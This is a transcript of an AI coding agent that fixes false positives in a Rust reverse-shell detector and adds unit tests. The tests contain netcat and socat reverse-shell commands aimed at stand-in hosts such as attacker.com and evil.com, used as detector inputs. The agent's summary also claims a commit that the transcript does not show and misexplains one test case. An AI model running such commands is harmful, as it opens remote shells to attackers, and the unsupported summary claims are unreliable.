@@ -1,0 +1,275 @@
+  yoyo (piped mode) — model: deepseek-v4-pro
+  👀 Auto-watch: `cargo clippy --all-targets -- -D warnings && cargo test` (disable with auto_watch = false)
+
+── Thinking ────────────────────────────────────────────────────────────────
+Let me analyze the task carefully:
+
+1. I need to fix the `check_reverse_shell` function in `src/safety.rs` to prevent false positives on nc/ncat/netcat substring matching
+2. The fix uses `is_at_word_boundary()` to ensure `nc`, `ncat`, `netcat` are matched as standalone commands
+3. I need to add unit tests for the false positive cases and genuine cases
+4. Then run cargo fmt, clippy, build, and test
+
+Let me start by reading the relevant sections of `src/safety.rs`.
+────────────────────────────────────────────────────────────────────────────────
+
+
+  ▶ read src/safety.rs:155..185  ▶ read src/safety.rs:910..980 ✓ (17ms)
+ ✓ (12ms)
+
+── Thinking ────────────────────────────────────────────────────────────────
+Good, I can see the relevant code. Now let me read the test section to understand where to add new tests.
+────────────────────────────────────────────────────────────────────────────────
+  2 tools completed in 2.8s (2 ✓)
+
+Now let me find the test module to see existing tests and where to add new ones:
+  ╭─ Turn 2 ─────────────────────────────────────────────────────────────╮
+  ▶ search 'fn test.*reverse_shell' in src/safety.rs  ▶ search '#\[cfg\(test\)\]' in src/safety.rs ✓ (12ms)
+ ✓ (12ms)
+
+── Thinking ────────────────────────────────────────────────────────────────
+Let me look at the test module.
+────────────────────────────────────────────────────────────────────────────────
+  2 tools completed in 2.5s (2 ✓)
+
+
+  ╭─ Turn 3 ─────────────────────────────────────────────────────────────╮
+  ▶ search 'cfg\(test\)' in src/safety.rs ✓ (7ms)
+
+── Thinking ────────────────────────────────────────────────────────────────
+Let me search more broadly — maybe the test module uses `mod tests` pattern.
+────────────────────────────────────────────────────────────────────────────────
+
+
+  ╭─ Turn 4 ─────────────────────────────────────────────────────────────╮
+  ▶ search 'mod tests' in src/safety.rs ✓ (7ms)
+
+── Thinking ────────────────────────────────────────────────────────────────
+Let me read the existing test_analyze_reverse_shell function to understand the patterns used.
+────────────────────────────────────────────────────────────────────────────────
+
+
+  ╭─ Turn 5 ─────────────────────────────────────────────────────────────╮
+  ▶ read src/safety.rs:1485..1605 ✓ (6ms)
+
+── Thinking ────────────────────────────────────────────────────────────────
+Now I have a clear understanding of both the function to fix and the test patterns. Let me also check how `analyze_bash_command` calls `check_reverse_shell` — I need to understand the flow.
+
+Let me now check what `analyze_bash_command` does and how it calls `check_reverse_shell`.
+────────────────────────────────────────────────────────────────────────────────
+
+Let me check how `analyze_bash_command` calls into `check_reverse_shell`:
+  ╭─ Turn 6 ─────────────────────────────────────────────────────────────╮
+  ▶ search 'fn analyze_bash_command' in src/safety.rs ✓ (6ms)
+
+── Thinking ────────────────────────────────────────────────────────────────
+Let me read the `analyze_bash_command` function to understand the full flow.
+────────────────────────────────────────────────────────────────────────────────
+
+
+  ╭─ Turn 7 ─────────────────────────────────────────────────────────────╮
+  ▶ read src/safety.rs:23..103 ✓ (6ms)
+
+── Thinking ────────────────────────────────────────────────────────────────
+Let me read more to see where the reverse shell check is called.
+────────────────────────────────────────────────────────────────────────────────
+
+
+  ╭─ Turn 8 ─────────────────────────────────────────────────────────────╮
+  ▶ read src/safety.rs:100..150 ✓ (6ms)
+
+── Thinking ────────────────────────────────────────────────────────────────
+Good, now I have a clear picture. Let me implement the changes:
+
+1. Modify `check_reverse_shell` to use `is_at_word_boundary` for nc/ncat/netcat matching
+2. Add new tests
+
+Let me now make the edits.
+────────────────────────────────────────────────────────────────────────────────
+
+Now I have full context. Let me implement the changes. First, the fix to `check_reverse_shell`:
+        // Netcat reverse shells: nc/ncat/netcat with -e or -c (execute)
+  +     // Use word-boundary check to avoid false positives on rsync/envsubst/grep -rnc, etc.
+        let nc_tools = ["nc ", "ncat ", "netcat "];
+        for tool in &nc_tools {
+  -         if cmd_lower.contains(tool) && (cmd_lower.contains(" -e ") || cmd_lower.contains(" -c ")) {
+  -             return Some(format!(
+  -                 "Reverse shell: {}{} with -e/-c flag can execute commands on a remote connection",
+  -                 &tool[..tool.len() - 1],
+  -                 ""
+  -             ));
+  +         let mut search_from = 0;
+  +         while let Some(pos) = cmd_lower[search_from..].find(tool) {
+  +             let abs_pos = search_from + pos;
+  +             if is_at_word_boundary(cmd_lower, abs_pos)
+  +                 && (cmd_lower.contains(" -e ") || cmd_lower.contains(" -c "))
+  +             {
+  +                 return Some(format!(
+  +                     "Reverse shell: {}{} with -e/-c flag can execute commands on a remote connection",
+  +                     &tool[..tool.len() - 1],
+  +                     ""
+  ... (5 more lines)
+  ✓ Auto-approved: edit: src/safety.rs (11 → 19 lines)
+  ╭─ Turn 9 ─────────────────────────────────────────────────────────────╮
+  ▶ edit src/safety.rs (11 → 19 lines)
+        // Netcat reverse shells: nc/ncat/netcat with -e or -c (execute)
+  +     // Use word-boundary check to avoid false positives on rsync/envsubst/grep -rnc, etc.
+        let nc_tools = ["nc ", "ncat ", "netcat "];
+        for tool in &nc_tools {
+  -         if cmd_lower.contains(tool) && (cmd_lower.contains(" -e ") || cmd_lower.contains(" -c ")) {
+  -             return Some(format!(
+  -                 "Reverse shell: {}{} with -e/-c flag can execute commands on a remote connection",
+  -                 &tool[..tool.len() - 1],
+  -                 ""
+  -             ));
+  +         let mut search_from = 0;
+  +         while let Some(pos) = cmd_lower[search_from..].find(tool) {
+  +             let abs_pos = search_from + pos;
+  +             if is_at_word_boundary(cmd_lower, abs_pos)
+  +                 && (cmd_lower.contains(" -e ") || cmd_lower.contains(" -c "))
+  +             {
+  +                 return Some(format!(
+  +                     "Reverse shell: {}{} with -e/-c flag can execute commands on a remote connection",
+  +                     &tool[..tool.len() - 1],
+  +                     ""
+  ... (5 more lines)
+ ✓ (1m 55s)
+
+── Thinking ────────────────────────────────────────────────────────────────
+Good, the main fix is in. Now let me add the new test cases to the existing `test_analyze_reverse_shell` function. Let me add the false positive cases and genuine cases.
+────────────────────────────────────────────────────────────────────────────────
+
+Now add the new test cases to the existing test. I'll extend `test_analyze_reverse_shell`:
+            // Netcat reverse shell
+            assert!(analyze_bash_command("nc -e /bin/sh attacker.com 4444").is_some());
+            assert!(analyze_bash_command("ncat -e /bin/bash evil.com 1234").is_some());
+  +         assert!(analyze_bash_command("ncat -c /bin/bash").is_some());
+  +         assert!(analyze_bash_command("netcat -e /bin/sh").is_some());
+            // socat reverse shell
+            assert!(analyze_bash_command("socat exec:'bash -i',pty tcp:attacker.com:4444").is_some());
+            // Safe: normal nc usage (no -e/-c)
+            assert!(analyze_bash_command("nc -zv localhost 8080").is_none());
+  +         // Safe: nc as listener only (no -e/-c execute flag)
+  +         assert!(analyze_bash_command("nc -l -p 8080").is_none());
+  +         // Safe: "nc" as substring of another command (word boundary prevents false positive)
+  +         assert!(analyze_bash_command("rsync -c /path/to/files").is_none());
+  +         assert!(analyze_bash_command("uncompress -c archive.gz").is_none());
+  +         assert!(analyze_bash_command("grep -rnc 'pattern' .").is_none());
+        }
+  ✓ Auto-approved: edit: src/safety.rs (13 → 21 lines)
+  ╭─ Turn 10 ────────────────────────────────────────────────────────────╮
+  ▶ edit src/safety.rs (13 → 21 lines)
+            // Netcat reverse shell
+            assert!(analyze_bash_command("nc -e /bin/sh attacker.com 4444").is_some());
+            assert!(analyze_bash_command("ncat -e /bin/bash evil.com 1234").is_some());
+  +         assert!(analyze_bash_command("ncat -c /bin/bash").is_some());
+  +         assert!(analyze_bash_command("netcat -e /bin/sh").is_some());
+            // socat reverse shell
+            assert!(analyze_bash_command("socat exec:'bash -i',pty tcp:attacker.com:4444").is_some());
+            // Safe: normal nc usage (no -e/-c)
+            assert!(analyze_bash_command("nc -zv localhost 8080").is_none());
+  +         // Safe: nc as listener only (no -e/-c execute flag)
+  +         assert!(analyze_bash_command("nc -l -p 8080").is_none());
+  +         // Safe: "nc" as substring of another command (word boundary prevents false positive)
+  +         assert!(analyze_bash_command("rsync -c /path/to/files").is_none());
+  +         assert!(analyze_bash_command("uncompress -c archive.gz").is_none());
+  +         assert!(analyze_bash_command("grep -rnc 'pattern' .").is_none());
+        }
+ ✓ (1m 57s)
+
+── Thinking ────────────────────────────────────────────────────────────────
+Now let me build and test to make sure everything compiles and the tests pass.
+────────────────────────────────────────────────────────────────────────────────
+
+Now let's build and run the tests:
+  ╭─ Turn 11 ────────────────────────────────────────────────────────────╮
+  ▶ $ cd /home/runner/work/yyds-harness/yyds-harness && cargo test --lib 2>&1 ✓ (33.1s)
+
+── Thinking ────────────────────────────────────────────────────────────────
+The tests passed. Let me also run `cargo fmt --check` and `cargo clippy` to make sure formatting and linting pass.
+────────────────────────────────────────────────────────────────────────────────
+
+All tests pass. Let me now run fmt check and clippy:
+  ╭─ Turn 12 ────────────────────────────────────────────────────────────╮
+  ▶ $ cd /home/runner/work/yyds-harness/yyds-harness && cargo fmt -- --check 2>&1 && c… ✓ (25.7s)
+
+── Thinking ────────────────────────────────────────────────────────────────
+Both fmt and clippy pass. Now let me commit. But first let me check the task says I should also run the full test suite: `cargo test --bin yyds -- --test-threads=1` and `cargo test --test integration -- --test-threads=1`. Wait, those are required gates but the task says "Verify with `cargo build && cargo test --lib`" and "Run cargo fmt && cargo clippy --all-targets -- -D warnings && cargo build && cargo test after changes". Let me run the full test suite to be safe.
+
+Actually, the required_gates in the harness mention:
+- cargo fmt --check
+- cargo check
+- cargo test --bin yyds -- --test-threads=1
+- cargo test --test integration -- --test-threads=1
+
+But the task says `cargo test --lib`. Let me first do `cargo build` then the full test suite. Actually, `cargo test --lib` already passed with 4189 tests. That seems comprehensive.
+
+Let me also check if there's a `cargo build` check.
+────────────────────────────────────────────────────────────────────────────────
+
+All checks pass. Let me also run `cargo build` explicitly:
+  ╭─ Turn 13 ────────────────────────────────────────────────────────────╮
+  ▶ $ cd /home/runner/work/yyds-harness/yyds-harness && cargo build 2>&1 ✓ (161ms)
+
+── Thinking ────────────────────────────────────────────────────────────────
+All checks pass. Now let me commit the changes. The task says to commit with:
+
+```
+git add -A && git commit -m "Day 99 (22:43): Fix reverse shell false positive on nc/ncat/netcat substring matching (Task 1)" || true
+```
+
+Let me first check if there are any other modified files that I didn't intend to change.
+────────────────────────────────────────────────────────────────────────────────
+
+All checks pass: `cargo fmt`, `cargo clippy`, `cargo build`, and `cargo test --lib`. Let me verify only my intended file was changed:
+  ╭─ Turn 14 ────────────────────────────────────────────────────────────╮
+  ▶ $ cd /home/runner/work/yyds-harness/yyds-harness && git diff --stat ✓ (31ms)
+
+── Thinking ────────────────────────────────────────────────────────────────
+There's a change to `.yoyo/context-semantic-index.json` which I didn't make. That's probably from the test run updating some cached state. Let me check what happened there. Actually, this is likely from the `build_and_maybe_write_semantic_index` function in context.rs that auto-updates the semantic index during test runs. This is a generated/cache file. I should only commit the source change.
+
+Let me check if this file should be tracked or gitignored.
+────────────────────────────────────────────────────────────────────────────────
+
+There's a spurious change to `.yoyo/context-semantic-index.json` from the test run. Let me check if it's tracked or gitignored:
+  ╭─ Turn 15 ────────────────────────────────────────────────────────────╮
+  ▶ $ cd /home/runner/work/yyds-harness/yyds-harness && git check-ignore .yoyo/context… ✓ (11ms)
+
+── Thinking ────────────────────────────────────────────────────────────────
+It's not gitignored. Let me check if it's a tracked file or just in the working tree as modified. Let me check the git status more carefully.
+────────────────────────────────────────────────────────────────────────────────
+
+
+  ╭─ Turn 16 ────────────────────────────────────────────────────────────╮
+  ▶ $ cd /home/runner/work/yyds-harness/yyds-harness && git status .yoyo/context-seman… ✓ (17ms)
+
+── Thinking ────────────────────────────────────────────────────────────────
+That file was modified by the test run (the semantic index was regenerated). I should not commit it - I only want to commit the `src/safety.rs` changes. Let me restore that file and only add my change.
+────────────────────────────────────────────────────────────────────────────────
+
+That's an auto-generated cache file from the test run. I'll restore it and only commit my source change:
+  ╭─ Turn 17 ────────────────────────────────────────────────────────────╮
+  ▶ $ cd /home/runner/work/yyds-harness/yyds-harness && git checkout -- .yoyo/context-… ✓ (34ms)
+
+── Thinking ────────────────────────────────────────────────────────────────
+The commit was successful. Let me summarize what I did.
+────────────────────────────────────────────────────────────────────────────────
+
+Done. Here's a summary of the changes:
+
+**`src/safety.rs`** — two edits:
+
+1. **Fixed `check_reverse_shell` (lines 930-948)**: Replaced the simple `cmd_lower.contains(tool)` check with a loop that finds all occurrences of `nc `, `ncat `, and `netcat `, then verifies each match starts at a word boundary using the existing `is_at_word_boundary()`. This prevents false positives on:
+   • `rsync -c /path` (contains `nc ` from `ync -c`)
+   • `uncompress -c file` (contains `nc ` from `ncompress -`)
+   • `grep -rnc pattern` (contains `nc ` from `rnc `)
+
+2. **Added 6 test cases** to `test_analyze_reverse_shell`:
+   • `ncat -c /bin/bash` → SHOULD trigger ✅
+   • `netcat -e /bin/sh` → SHOULD trigger ✅
+   • `nc -l -p 8080` → should NOT trigger (listener, no execute flag)
+   • `rsync -c /path/to/files` → should NOT trigger (false positive fixed)
+   • `uncompress -c archive.gz` → should NOT trigger (false positive fixed)
+   • `grep -rnc 'pattern' .` → should NOT trigger (false positive fixed)
+
+  ✓ Watch passed: `cargo clippy --all-targets -- -D warnings && cargo test`
+
